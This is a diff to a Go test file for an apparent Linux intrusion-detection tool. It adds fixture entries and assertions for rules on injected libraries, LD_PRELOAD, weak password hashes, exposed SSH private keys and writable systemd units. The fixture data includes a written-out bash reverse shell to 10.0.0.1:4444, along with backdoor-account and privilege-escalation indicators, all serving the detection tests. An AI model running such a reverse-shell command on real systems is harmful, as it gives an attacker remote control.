@@ -17,6 +17,10 @@ func fixtureSnapshot() *probe.Snapshot {
 			{PID: 6001, Comm: "haxdoor", Exe: "/usr/sbin/haxdoor", EnvironEmpty: true, PacketSocket: true}, // BPFDoor-like
 			{PID: 6002, Comm: "dhclient", Exe: "/sbin/dhclient", PacketSocket: true},                       // benign sniffer (DHCP)
 			{PID: 6100, Comm: "bash", Exe: "/bin/bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, // reverse shell
+			{PID: 6200, Comm: "nginx", Exe: "/usr/sbin/nginx", MappedLibsWritable: []string{"/tmp/.x/libhook.so"}},
+			{PID: 6201, Comm: "postgres", Exe: "/usr/lib/postgresql/16/bin/postgres", MappedLibsDeleted: []string{"/run/.x/libgone.so"}},
+			{PID: 6202, Comm: "cron", Exe: "/usr/sbin/cron", PreloadEnv: "LD_PRELOAD=/tmp/.x/evil.so"},
+			{PID: 6203, Comm: "apache2", Exe: "/usr/sbin/apache2", PreloadEnv: ""}, // benign: no library finding
 		},
 		ListeningSockets: []probe.Socket{
 			{Proto: "tcp", LAddr: "0.0.0.0", LPort: 4444, PID: 4711, Comm: "payload"},
@@ -75,6 +79,14 @@ func fixtureSnapshot() *probe.Snapshot {
 			{Name: "toor", UID: 0, GID: 0, Shell: "/bin/bash"},               // backdoor: UID 0 != root
 			{Name: "www-data", UID: 33, GID: 33, Shell: "/usr/sbin/nologin"}, // benign
 			{Name: "backdoor", UID: 33, GID: 100, Shell: "/bin/bash"},        // duplicate UID with www-data
+			{Name: "legacyadm", UID: 1500, GID: 1500, Shell: "/bin/bash", PasswordScheme: "md5crypt"},
+			{Name: "oldbatch", UID: 1501, GID: 1501, Shell: "/bin/bash", PasswordScheme: "des"},
+			{Name: "appsvc", UID: 1502, GID: 1502, Shell: "/usr/sbin/nologin", PasswordScheme: "md5crypt"}, // cannot log in: benign
+			{Name: "alice", UID: 1503, GID: 1503, Shell: "/bin/bash", PasswordScheme: "sha512crypt"},       // benign
+		},
+		PrivateKeys: []probe.PrivateKeyFile{
+			{Path: "/root/.ssh/id_ed25519_leak", Owner: "root", Type: "ssh-ed25519", Mode: "0644"},
+			{Path: "/home/alice/.ssh/id_ed25519", Owner: "alice", Type: "ssh-ed25519", Mode: "0600", Encrypted: true}, // benign
 		},
 		KernelLog: []probe.KernelLogEntry{
 			{Seq: 100, Message: "device eth0 entered promiscuous mode"},                       // sniffing
@@ -180,7 +192,7 @@ func fixtureSnapshot() *probe.Snapshot {
 		SuidBinaries: []probe.FileEntry{
 			{Path: "/usr/bin/python3.11", Mode: "4755", SUID: true}, // GTFOBins SUID interpreter
 		},
-		WritablePersistence: []string{"/etc/systemd/system/web.service"}, // unit writable by non-root
+		WritablePersistence: []probe.WritablePersistenceEntry{{Path: "/etc/systemd/system/web.service", Via: "other", Mode: "0666"}}, // unit writable by non-root
 		DangerousCapabilities: []probe.FileEntry{
 			{Path: "/usr/bin/python3.11", Mode: "0755", Caps: "cap_setuid"}, // privesc capability
 		},
@@ -384,6 +396,17 @@ func TestBuiltinRulesFireOnMaliciousSnapshot(t *testing.T) {
 	}
 	if got["packet-sniffer-process"] != 1 {
 		t.Errorf("packet-sniffer rule should fire once (haxdoor, not dhclient), got %d", got["packet-sniffer-process"])
+	}
+	for _, id := range []string{"process-library-from-writable-path", "process-library-deleted", "process-ld-preload-env"} {
+		if got[id] != 1 {
+			t.Errorf("%s should fire once (one process carries it; sshd and apache2 do not), got %d", id, got[id])
+		}
+	}
+	if got["weak-password-hash-scheme"] != 2 {
+		t.Errorf("weak-hash rule should fire for legacyadm and oldbatch only (not nologin, not sha512), got %d", got["weak-password-hash-scheme"])
+	}
+	if got["unprotected-ssh-private-key"] != 1 {
+		t.Errorf("private-key rule should fire once (the unencrypted key, not the passphrase-protected one), got %d", got["unprotected-ssh-private-key"])
 	}
 	if got["process-empty-environ"] != 1 {
 		t.Errorf("empty-environ rule should fire once (haxdoor), got %d", got["process-empty-environ"])
